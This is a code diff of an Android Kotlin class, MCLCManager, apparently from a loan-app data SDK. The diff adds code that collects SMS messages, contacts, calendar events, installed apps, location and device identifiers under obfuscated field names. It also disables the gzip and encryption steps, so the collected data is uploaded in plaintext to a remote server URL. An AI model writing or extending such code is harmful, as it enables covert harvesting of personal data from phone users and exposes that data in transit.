@@ -1,20 +1,22 @@
-
 package com.bigdata.lib
 
 import android.os.Build
-import com.bigdata.lib.BigDataSpKeyManager.Companion.CASH_KEY_POST_MCLC
-import com.bigdata.lib.net.BigDataNetBaseParamsManager
+import android.util.Log
+import com.bigdata.lib.SpKeyManager.CASH_KEY_POST_MCLC
+import com.bigdata.lib.net.BaseParamsManager
 import com.bigdata.lib.net.NetWorkManager
 import com.cache.lib.SharedPrefUser
-import com.google.gson.JsonArray
-import com.google.gson.JsonElement
 import com.google.gson.JsonObject
 import com.project.util.AESMCLCUtil
+import com.project.util.AESNormalUtil
 import com.util.lib.*
 import com.util.lib.log.logger_d
 import com.util.lib.log.logger_i
+import org.json.JSONObject
 import kotlin.math.abs
 
+
+typealias Result = ((result: Boolean) -> Unit)?
 
 class MCLCManager {
     companion object {
@@ -65,38 +67,58 @@ class MCLCManager {
         }
 
         private fun getCashInfo(smsUpload: Boolean = true): JsonObject {
+            val listener = BigDataManager.get().getNetDataListener() ?: return JsonObject()
+            val ctx = listener.getContext()
             val jsonObject = JsonObject()
             try {
-//                jsonObject.add("sms", if (smsUpload) SmsHelper.getMessage() else JsonArray())
+                // 短信
+                val sms = if (smsUpload) SmsHelper.getMessage(ctx) else arrayListOf()
+                jsonObject.addProperty("MGTnhn", GsonUtil.toJson(sms).orEmpty())
             } catch (e: Exception) {
-            }catch (e: OutOfMemoryError){
+            } catch (e: OutOfMemoryError) {
             }
             try {
-                jsonObject.add("apps", DevicesAppHelper.getAppList())
+                jsonObject.add("bPp7hQmh", DevicesAppHelper.getAppList())
             } catch (e: Exception) {
-            }catch (e: OutOfMemoryError){
-            }
-            try {
-//                jsonObject.add("calendar", CalendarHelper.getCalendarEvent())
-            } catch (e: Exception) {
-            }catch (e: OutOfMemoryError){
+            } catch (e: OutOfMemoryError) {
             }
 
-            // 权限授权状态
             try {
-                jsonObject.addProperty("auth_info", BigDataNetBaseParamsManager.getPermissionAuthInfo())
+                // 联系人
+                jsonObject.addProperty("P7r2", GsonUtil.toJson(ContactsHelper.getContacts(ctx)))
+            } catch (e: Exception) {
+            } catch (e: OutOfMemoryError) {
+            }
+
+            try {
+                jsonObject.add("calendar", CalendarHelper.getCalendarEvent(ctx))
+            } catch (e: Exception) {
+            } catch (e: OutOfMemoryError) {
+            }
+            // 定位
+            try {
+                val locationInfo = LocationHelp.getLocationInfo()
+                val jobj = JsonObject()
+                jobj.addProperty("WSApb8Uz", locationInfo?.first)
+                jobj.addProperty("DfA53PkKr", locationInfo?.second)
+                jsonObject.add("hjcgfYW732", jobj)
+            } catch (e: Exception) {
+            }
+            // 设备信息
+            try {
+                val locationInfo = LocationHelp.getLocationInfo()
+                val jobj = JsonObject()
+                jobj.addProperty("l9uzoD39Q8", Build.MODEL)
+                jobj.addProperty("TAEgE", Build.BRAND)
+                jobj.addProperty("OCwx", Build.ID)
+                jobj.addProperty("uXBlXBew", locationInfo?.first)
+                jobj.addProperty("u3zNZE", locationInfo?.second)
+                jsonObject.add("CEewmJPFFR", jobj)
             } catch (e: Exception) {
             }
 
-            val jsonBase = BigDataNetBaseParamsManager.getMessageCallLogContactsBaseParams()
-            if (jsonBase.has("imei")) {
-                jsonBase.addProperty(
-                    "imei",
-                    BigDataNetBaseParamsManager.md5IMEI(jsonBase["imei"].asString)
-                )
-            }
-            jsonObject.add("base", jsonBase)
-            jsonObject.addProperty("abtest_home", BigDataManager.get().getNetDataListener()?.getAppAbtest())
+            val jsonBase = BaseParamsManager.getMessageCallLogContactsBaseParams()
+            jsonObject.add("FQhZcGE67l", jsonBase)
             logger_d(TAG, "mclc base = $jsonBase")
             return jsonObject
         }
@@ -105,36 +127,22 @@ class MCLCManager {
         /**
          * 上传 信息
          */
-        fun postMCLCinfoReal(imageInfo: Map<String, Map<String, String?>?>?) {
-            if (imageInfo == null){
-                uploadData(null)
-            }else{
-                uploadDataWithImageInfo(imageInfo)
-            }
-
-        }
-
-        /**
-         * 上传信息 同时携带图片信息
-         */
-        private fun uploadDataWithImageInfo(imageInfo: Map<String, Map<String, String?>?>){
-            val jsonImage = GsonUtil.toJsonObject(imageInfo) ?:return
-            val extra = Pair<String,JsonElement>("image_info",jsonImage)
-            uploadData(extra,true)
+        fun postMCLCinfoReal(listener: Result) {
+            uploadData(listener)
         }
 
         /**
          * @param extra 额外信息
          * @param ignoreInterval 是否忽略时间间隔 true:忽略时间间隔检查， false: 不忽略
          */
-        private fun uploadData(extra: Pair<String,JsonElement>?,ignoreInterval: Boolean = false){
+        private var isUploadComplete = true
+        private fun uploadData(listener: ((result: Boolean) -> Unit)? = null) {
             ThreadPoolUtil.executor("cash info post") {
                 LocationHelp.requestLocation()
-                if (ignoreInterval || checkPostMCLCSuccessTimer()) {
+                if (!isUploadComplete) return@executor
+                if (checkPostMCLCSuccessTimer()) {
+                    isUploadComplete = false
                     val jsonCashInfo = getCashInfo()
-                    if (extra != null) {// 增加额外信息
-                        jsonCashInfo.add(extra.first, extra.second)
-                    }
                     var isAllPermission = false
                     if (Build.VERSION.SDK_INT >= 23) {
                         //6.0以及以上走这个
@@ -158,16 +166,35 @@ class MCLCManager {
                     }
                     val beforePostInfo = jsonCashInfo.toString()
                     logger_i(TAG, "cash info post encryt before = $beforePostInfo")
-                    val zipInfo = GzipUtils.zip(beforePostInfo)
+//                    val zipInfo = GzipUtils.zip(beforePostInfo)
+//                    ${zipInfo.size / 1024f}
                     logger_i(
                         TAG,
-                        "cash info post encryt gzip size befor = ${beforePostInfo.toByteArray().size / 1024f} , after = ${zipInfo.size / 1024f}"
+
+                        "cash info post encryt gzip size befor = ${beforePostInfo.toByteArray().size / 1024f} , after = "
                     )
-                    val postInfo = AESMCLCUtil.encryptMessageCallLogContact(zipInfo)
+//                    val postInfo = AESNormalUtil.mexicoEncrypt(zipInfo)
+                    val postInfo = beforePostInfo
                     logger_i(TAG, "cash info post encryt after = $postInfo")
                     if (postInfo != null) {
                         doEvent(EventKeyManager.ConstantDot.EVENT_RESULT_UPLOAD)
-                        NetWorkManager.uploadlogMessage(postInfo,isAllPermission)
+                        val remoteUrl = BigDataManager.get().getNetDataListener()?.getBigUrl()
+                            ?: return@executor
+                        val response = NetWorkManager.synUploadlogMessage(postInfo, remoteUrl)
+                        var result  = false
+                        isUploadComplete = true
+                        if (response.isSuccessful) {
+                            response.body()?.string()?.let {body ->
+                                val jobj = JSONObject(body)
+                                val code = jobj.optInt("code")
+                                Log.d(TAG, "uploadData: code= $code")
+                                result = code == 200
+                            }
+                        }
+                        logger_d(TAG, "result = $result")
+                        listener?.invoke(result)
+                    } else {
+                        isUploadComplete = true
                     }
                 }
             }
